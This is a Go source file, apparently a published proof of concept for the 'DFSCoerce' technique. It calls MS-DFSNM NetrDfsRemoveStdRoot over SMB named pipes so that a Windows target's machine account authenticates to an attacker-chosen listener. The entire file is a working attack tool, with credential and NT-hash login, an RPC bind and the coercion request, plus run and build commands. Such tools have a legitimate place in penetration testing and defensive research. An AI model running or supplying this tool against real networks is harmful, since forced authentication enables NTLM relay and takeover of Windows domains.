// File name          : coerce_poc.go
// Author             : Podalirius (@podalirius_)
// Date created       : 10 Sep 2026
//
// Proof of concept for coercing authentication with MS-DFSNM::NetrDfsRemoveStdRoot()
// (opnum 13), written with the TheManticoreProject libraries:
//
//   - github.com/TheManticoreProject/goopts    for the command line parsing
//   - github.com/TheManticoreProject/Manticore for SMB, DCE/RPC and the netdfs interface
//
// NetrDfsRemoveStdRoot removes a stand-alone DFS namespace hosted by another server: the
// server processing the call has to reach out to the DFS root target it is named
// ([MS-DFSNM] 3.1.4.1.14), so pointing ServerName at the listener makes the remote machine
// account authenticate to it over SMB. This is the "DFSCoerce" technique.
//
// ServerName is "the host name of the DFS root target" — a bare host name, *not* a UNC
// path: no leading backslashes, no share and no file component. The share name goes in the
// separate RootShare parameter, which is why this PoC has no --share/--file flags.
//
// Run it from this directory (go.mod pins the libraries):
//
//	go run coerce_poc.go --target 192.168.1.30 --listener 192.168.1.10 -d LAB.local -u user -p 'password'
//
// or build a standalone binary with:
//
//	go build -o coerce_poc coerce_poc.go
package main

import (
	"fmt"
	"math/rand/v2"
	"os"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
	netdfs "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/4fc742e0-4a10-11cf-8273-00aa004ae673/3.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	smbclient "github.com/TheManticoreProject/Manticore/network/smb/client"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	"github.com/TheManticoreProject/goopts/parser"
	"golang.org/x/term"
)

var (
	// Configuration
	debug bool

	// Network settings
	target     string
	targetPort int
	pipeName   string

	// Coercion settings
	listener  string
	rootShare string

	// Authentication details
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string
	authNoPass   bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: "Windows auth coerce using MS-DFSNM::NetrDfsRemoveStdRoot() - by Remi GASCOU (Podalirius) - v1.0.0",
	}

	ap.SetOptShowBannerOnHelp(true)
	ap.SetOptShowBannerOnRun(true)

	ap.NewBoolArgument(&debug, "", "--debug", false, "Enable debug mode.")

	// Network settings
	group_network, err := ap.NewArgumentGroup("Network")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_network.NewStringArgument(&target, "-t", "--target", "", true, "IP address or hostname of the target.")
		group_network.NewTcpPortArgument(&targetPort, "", "--target-port", 445, false, "Port of the SMB service on the target.")
		// The README lists this interface on: \PIPE\netdfs.
		// Manticore's PipeName is the endpoint the protocol documents as its own
		// ([MS-DFSNM] 2.1 Transport).
		group_network.NewStringArgument(&pipeName, "", "--pipe", netdfs.PipeName, false, "Named pipe to bind the netdfs interface on.")
	}

	// Coercion settings
	group_coerce, err := ap.NewArgumentGroup("Coercion")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_coerce.NewStringArgument(&listener, "-l", "--listener", "", true, "IP address or hostname of the listener the target should authenticate to (sent as the bare ServerName, without backslashes).")
		group_coerce.NewStringArgument(&rootShare, "", "--root-share", "", false, "DFS root target share name sent as RootShare (default: a random 8-character name).")
	}

	// Authentication
	group_auth, err := ap.NewArgumentGroup("Authentication")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_auth.NewStringArgument(&authDomain, "-d", "--domain", "", false, "(FQDN) domain to authenticate to.")
		group_auth.NewStringArgument(&authUsername, "-u", "--user", "", false, "User to authenticate as.")
	}

	// Secret
	group_secret, err := ap.NewNotRequiredMutuallyExclusiveArgumentGroup("Secret")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_secret.NewBoolArgument(&authNoPass, "", "--no-pass", false, "Don't ask for a password (null session).")
		group_secret.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		group_secret.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
	}

	ap.Parse()
}

// NetrDfsRemoveStdRoot (opnum 13), as documented by [MS-DFSNM] 3.1.4.1.14:
//
//	NET_API_STATUS NetrDfsRemoveStdRoot(
//	    [in, string] WCHAR* ServerName,
//	    [in, string] WCHAR* RootShare,
//	    [in] DWORD ApiFlags
//	);
//
// The binding handle is implicit in Go. The request/response structs below are lifted
// verbatim from Manticore's generated call for this opnum
// (network/dcerpc/interfaces/4fc742e0-4a10-11cf-8273-00aa004ae673/3.0/functions/13_NetrDfsRemoveStdRoot.go), which is the reviewed
// translation of that IDL; the wrapper there folds a nonzero return value into an
// error string, so the call is issued here to keep the numeric status.
//
// ndr.WSTR marshals each [in,string] WCHAR* as the inline wide string the IDL asks for —
// the NUL terminator is added by the marshaller, so it must not be appended by hand as the
// Python PoC has to do.

// netrDfsRemoveStdRootRequest carries the [in] parameters of NetrDfsRemoveStdRoot.
type netrDfsRemoveStdRootRequest struct {
	ServerName ndr.WSTR
	RootShare  ndr.WSTR
	ApiFlags   ndr.DWORD
}

// netrDfsRemoveStdRootResponse carries the [out] parameters and return value of NetrDfsRemoveStdRoot.
type netrDfsRemoveStdRootResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

func (*netrDfsRemoveStdRootRequest) Opnum() uint16 { return netdfs.OpnumNetrDfsRemoveStdRoot }

// apiFlags is the value sent for the ApiFlags parameter. [MS-DFSNM] and the method
// documentation state it "is reserved for future use and is ignored by the server", so any
// value works; 1 is what this method's Python PoC sends, and sending the same value keeps
// the two PoCs byte-identical on the wire.
const apiFlags ndr.DWORD = 1

// win32ErrorNames names the Win32 error codes ([MS-ERREF] 2.2) that this interface returns
// but that Manticore's status table for it does not cover yet. netdfs.StatusString is
// always consulted first, so the codes Manticore does define keep their names from there
// and this map only fills the gaps. ERROR_BAD_NETPATH is the one a coercion normally ends
// on: the target could not reach the DFS root target — after trying to.
var win32ErrorNames = map[uint32]string{
	0x00000003: "ERROR_PATH_NOT_FOUND",
	0x00000035: "ERROR_BAD_NETPATH",
	0x00000043: "ERROR_BAD_NET_NAME",
	0x0000007b: "ERROR_INVALID_NAME",
}

// statusName resolves a Win32 status code to its constant name, preferring Manticore's
// own table. StatusString falls back to a "0x%08x" rendering for codes it does not know,
// which is how an unknown code is detected here.
func statusName(status uint32) string {
	if name := netdfs.StatusString(status); !strings.HasPrefix(name, "0x") {
		return name
	}
	if name, found := win32ErrorNames[status]; found {
		return name
	}
	return "UNKNOWN_ERROR"
}

// formatStatus renders a status as "ERROR_BAD_NETPATH (0x00000035)".
func formatStatus(status uint32) string {
	return fmt.Sprintf("%s (0x%08x)", statusName(status), status)
}

// interfaceSyntaxes returns the abstract syntaxes to try, in order. A protocol may be
// registered under several interface UUIDs and a given Windows version may only expose
// some of them, so a rejected bind is a reason to try the next candidate, not to stop.
// The README lists a single netdfs interface (4fc742e0-4a10-11cf-8273-00aa004ae673 v3.0).
func interfaceSyntaxes() []syntax.SyntaxID {
	candidates := []syntax.SyntaxID{netdfs.SyntaxID()}
	return candidates
}

// randomName generates a random alphanumeric name, as the Python PoC's gen_random_name()
// does for RootShare: a namespace that does not exist on the listener is the point, and a
// fresh name each run avoids colliding with a root left behind by a previous attempt.
func randomName(length int) string {
	const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	name := make([]byte, length)
	for i := range name {
		name[i] = alphabet[rand.IntN(len(alphabet))]
	}
	return string(name)
}

// promptPassword asks for the password on the terminal, as the Python PoC does when a
// username is given with neither a password, hashes, nor --no-pass.
func promptPassword() (string, error) {
	fmt.Print("Password: ")
	secret, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	if err != nil {
		return "", err
	}
	return string(secret), nil
}

func main() {
	parseArgs()

	if debug {
		logger.SetLevel(logger.LevelDebug)
	}

	if rootShare == "" {
		rootShare = randomName(8)
	}

	if authUsername != "" && authPassword == "" && authHashes == "" && !authNoPass {
		password, err := promptPassword()
		if err != nil {
			logger.Errorf("Error reading password: %s", err)
			return
		}
		authPassword = password
	}

	creds, err := credentials.NewCredentials(authDomain, authUsername, authPassword, authHashes)
	if err != nil {
		logger.Errorf("Error creating credentials: %s", err)
		return
	}

	// Negotiate the best dialect the target supports (SMB1 or SMB2+), the DCE/RPC
	// named-pipe transport is then the same for the caller either way.
	logger.Infof("Connecting to %s:%d ...", target, targetPort)
	smb, err := smbclient.Dial(target, targetPort, smbclient.Options{})
	if err != nil {
		logger.Errorf("Error connecting to %s:%d: %s", target, targetPort, err)
		return
	}
	defer smb.Disconnect()
	logger.Infof("Connected, negotiated dialect [%s]", smb.Dialect())

	if err := smb.Login(creds); err != nil {
		logger.Errorf("Error authenticating to %s: %s", target, err)
		return
	}
	defer smb.Logoff()
	logger.Infof("Authenticated as [%s]", strings.Trim(authDomain+"\\"+authUsername, "\\"))

	// Named pipes live on the IPC$ tree ([MS-RPCE] 2.1.1.2).
	if err := smb.TreeConnect("IPC$"); err != nil {
		logger.Errorf("Error connecting to share IPC$: %s", err)
		return
	}
	defer smb.TreeDisconnect()

	// A rejected bind leaves the association unusable, so every candidate syntax gets a
	// fresh pipe and client of its own.
	var rpc *dcerpcclient.Client
	for _, abstractSyntax := range interfaceSyntaxes() {
		transport, err := smb.RPCTransport(pipeName)
		if err != nil {
			logger.Errorf("Error opening pipe %s: %s", pipeName, err)
			return
		}

		logger.Infof("Binding to <%s> on %s ...", abstractSyntax, pipeName)
		candidate := dcerpcclient.NewClient(transport)
		// No SetAuth here, deliberately: unlike EFSRPC, the netdfs interface rejects an
		// RPC-level authentication verifier on the bind ("authentication type not
		// recognized", reject reason 0x8) and is happy with the authenticated SMB session
		// alone. The Python PoC binds the same way.
		if err := candidate.Bind(abstractSyntax); err != nil {
			logger.Warnf("Bind rejected: %s", err)
			candidate.Close()
			continue
		}
		logger.Info("Bind successful")
		rpc = candidate
		break
	}
	if rpc == nil {
		logger.Errorf("Could not bind the netdfs interface on %s, it is not listening on this endpoint.", pipeName)
		return
	}
	defer rpc.Close()

	logger.Infof("Calling NetrDfsRemoveStdRoot(ServerName='%s', RootShare='%s', ApiFlags=%d) ...", listener, rootShare, apiFlags)
	request := &netrDfsRemoveStdRootRequest{
		// A bare host name, as [MS-DFSNM] describes ServerName: the target builds the
		// \\ServerName\RootShare path itself.
		ServerName: ndr.WSTR(listener),
		RootShare:  ndr.WSTR(rootShare),
		ApiFlags:   apiFlags,
	}
	var response netrDfsRemoveStdRootResponse

	if err := rpc.Invoke(request, &response); err != nil {
		// A DCE/RPC fault means the call never reached the method: a wrong interface,
		// endpoint or parameter modelling, not a refusal by the server.
		logger.Errorf("NetrDfsRemoveStdRoot() faulted: %s", err)
		return
	}

	status := uint32(response.Status)
	if status == netdfs.StatusSuccess {
		logger.Infof("NetrDfsRemoveStdRoot() returned %s, check your listener.", formatStatus(status))
		return
	}
	// Any other status is expected: the target cannot remove a DFS root that does not
	// exist on a host it cannot reach, but it has already authenticated to the listener to
	// find that out.
	logger.Infof("NetrDfsRemoveStdRoot() returned a status: %s", formatStatus(status))
	logger.Info("The call was processed by the target, check your listener.")
}
